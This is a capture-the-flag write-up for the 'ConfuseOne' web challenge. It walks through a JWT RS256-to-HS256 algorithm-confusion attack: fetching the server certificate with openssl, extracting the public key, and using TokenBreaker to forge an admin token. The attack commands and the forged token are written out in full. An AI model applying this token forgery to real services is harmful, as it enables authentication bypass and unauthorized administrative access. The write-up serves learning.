# ConfuseOne

### Author: [Phung Duc Thang](https://github.com/thangpd3160)

This is blackbox crypto challenge! There is no source, and actually the most practical one.

![image](https://user-images.githubusercontent.com/61876488/138580390-4216d4e3-f078-43f8-bcf1-7e884401a72b.png)

### 1. Challenge analysis:

First at all, just register and login. Browse the web and I see the profile page has a suspected line, which is "You are not admin":

![image](https://user-images.githubusercontent.com/61876488/138580404-e032def2-ad93-488e-b02b-006fa4f2fa1a.png)

The flag may in this page, but we need to login as admin. It impossible as normal. Now, intercept the request, I see the web use jwt token. Try to decode, I get the following result:

![image](https://user-images.githubusercontent.com/61876488/138580417-de0aa608-32c8-4e24-a8a4-a7c72bc6429a.png)

The point this token is signed by RS256 algorithm. I google the current vulnerability of jwt token and found that there is critical vulnerability related to it, which can change the token by change algorithm from RS256 to HS256. You can learn more the attack at [here](https://habr.com/en/post/450054/) as I will not reinvent the wheel 😄

The last problem which parameter's value we need to change? As we look from the jwt token, the only parameter that is most susceptible is `username`, as the other parameters are either non-determined or trivival for authorization. So, we need to change the value of `username` to `admin` to get the flag!

### 2. Attack and get the flag:

I use [TokenBreaker](https://github.com/cyberblackhole/TokenBreaker) on github to help me perform this attack. Everything I need is this to pull out the public key of server. It's easy as we can get it by **openssl**.

##### a) Get public key:

The technical detail step as following:

- Connect to the server using **openssl** to get the public certificate:

```
thangpd3160@kali:~$ openssl s_client -connect 139.180.213.39:443
[REDACTED]
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDETCCAfmgAwIBAgIUaYCW/HwHq1b/axHRKM0BpixnwugwDQYJKoZIhvcNAQEL
BQAwGDEWMBQGA1UEAwwNY3J5cHRvMjAwLmNvbTAeFw0yMTEwMTQwMjM2NDBaFw0y
MjEwMTQwMjM2NDBaMBgxFjAUBgNVBAMMDWNyeXB0bzIwMC5jb20wggEiMA0GCSqG
SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDunk8oVD+9cKXT96aOdl/xZ5RqCpxsStFT
f8l/DW2/m4X5scbhq8Qhco0Mvns75KYtCWAKSvwCzgTSMDcO1/Fzt6xRI4EZPtVS
WE2Mq0VffFCYAzS6q07XWbFZ2tyFqbi/Xudh7tAA6TI098AGHKLjWZDJCA/ZbiQJ
u+7XL1y7TjCWBOEmrcWS7G1Cte1oUhUFfXygmskiTpxX+r3ABJuXT9FZcWu8ZMhl
fMGp/y00sBDCp8xxAcIl/D5lAUzWKyyxW5g46s5WSRHkGpxX/uQUGMwV/WM3/199
uvtVkQri88toQMzd03sWKJJZxuvJpwpw8vi/rbnB4c5/4wfuFjtHAgMBAAGjUzBR
MB0GA1UdDgQWBBTmW/TdQlcea4S2DtpxVqa6n6jYFTAfBgNVHSMEGDAWgBTmW/Td
Qlcea4S2DtpxVqa6n6jYFTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
A4IBAQBUBWMa50jaKO5GtqdCe2jLhfmEgtc6iLr+XO8jGsK2OzaHTHO9N/mjDOJ0
AAdINbCO2qfYsXBLTgzBLiAsE+IuzfxIiTmzVoLhiV0iWuy1NMXMEy1khAtVjdkx
D1zxCdCw/xe70tmGEfVFGF45OPkdsbDa3fr6tSF2Cl7ZXehdpxuzogWAqV4zqn49
XqLzZvB5gL5LbsbjzoUImce0eIxHgrkxM1RurgyN5EwV+SxkXCGxTmdMHI3Gzebf
t5xM393St030npRIRiAIpiLZUX7Yh7+PU079rE0wHtNvqorW+CrGD92TtYS7IufT
E9PrY2ghO453/QM0jW/E429p/aha
-----END CERTIFICATE-----
subject=CN = crypto200.com

issuer=CN = crypto200.com

---
[REDACTED]
```

- Save the certificate to files:

![image](https://user-images.githubusercontent.com/61876488/138580530-06b66f6d-ac84-4859-a808-be0d561ec917.png)

- Export public key from the certificate:

```
thangpd3160@kali:~$ openssl x509 -pubkey -noout -in cf.pem  > pubkey.pem
```

The public key may look as following:

```
thangpd3160@kali:~$ cat pubkey.pem | xxd -p | tr -d "\\n"
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541377035504b46512f7658436c302f656d6a6e5a660a38576555616771636245725255332f4a66773174763575462b6248473461764549584b4e444c35374f2b536d4c516c67436b723841733445306a4133447466780a6337657355534f4247543756556c684e6a4b7446583378516d414d307571744f31316d785764726368616d347631376e59653751414f6b794e506641426879690a34316d51795167503257346b4362767531793963753034776c6754684a7133466b7578745172587461464956425831386f4a724a496b3663562f7139774153620a6c302f5257584672764754495a587a42716638744e4c41517771664d635148434a66772b5a51464d31697373735675594f4f724f566b6b5235427163562f376b0a46426a4d4666316a4e2f396666627237565a454b3476504c6145444d33644e3746696953576362727961634b63504c34763632357765484f662b4d48376859370a52774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```

##### b) Generate new token and submit to get flag:

- Run TokenBreaker tool to generate new token. Remember to change the value of `username` to `admin`. The new token is shorter than the origianl one.

```
thangpd3160@kali:~$ python3 RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2MzQ0ODE0OTIsIm5iZiI6MTYzNDQ4MjQ5MiwiZXhwIjoxNjM0NDg3NDkyLCJkYXRhIjp7ImlkIjoiMTM3IiwidXNlcm5hbWUiOiJ0aGFuZ3BkMTEiLCJlbWFpbCI6InRoYW5ncGQxMUBnbWFpbC5jb20ifX0.n7t8HqHsWYCdR4fk_-VPgRHtJuNKb1DGQPAGWcNrlaxjaRnft8fbPUOLBmgUD1xY6Xp0OL4ov4BuhvbzbOvjrAbzfjXq4MEDiadDxnObQr9c3gPrB82uoY3YyVqtg_TXa8yfz5HMWsMGpKg5QjRNVqWYCqF1-6-LNuLkp54mjPeJctcQHVONCy8tIpCR08E9_G4vpLEEYBPcXPkcD44FH56xnNUlMpDkTayhv5wZ-2nPuFiBsuNP_glp-6abAsDgMSbSHLSQc-mPEecTVx929lNHCjhzFIFqXEFdNNXt3Y3JWdx-VXIIUM2yfxKkubV8NCn8s9nfwXpbIMfIPA9rPQ -p pubkey.pem
 ___  ___   _     _         _  _ __  __   _   ___
| _ \/ __| /_\   | |_ ___  | || |  \/  | /_\ / __|
|   /\__ \/ _ \  |  _/ _ \ | __ | |\/| |/ _ \ (__
|_|_\|___/_/ \_\  \__\___/ |_||_|_|  |_/_/ \_\___|

[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
[*] Decode Payload value: {"iat":1634481492,"nbf":1634482492,"exp":1634487492,"data":{"id":"137","username":"thangpd11","email":"thangpd11@gmail.com"}}
[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
[<] Modify Header? [y/N]: 
[<] Enter Your Payload value: {"iat":1634481492,"nbf":1634482492,"exp":1634487492,"data":{"id":"137","username":"admin","email":"thangpd11@gmail.com"}}
[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MzQ0ODE0OTIsIm5iZiI6MTYzNDQ4MjQ5MiwiZXhwIjoxNjM0NDg3NDkyLCJkYXRhIjp7ImlkIjoiMTM3IiwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoidGhhbmdwZDExQGdtYWlsLmNvbSJ9fQ.HuhcSbgVOFqbUGfY9KQ2g4thh_v4TuQioNujlMiXNOY
```

- Replace token value in burp request, then submit to get the flag:

![image](https://user-images.githubusercontent.com/61876488/138580616-a85f5afb-cedd-45b1-b186-80bae5bdd9f1.png)


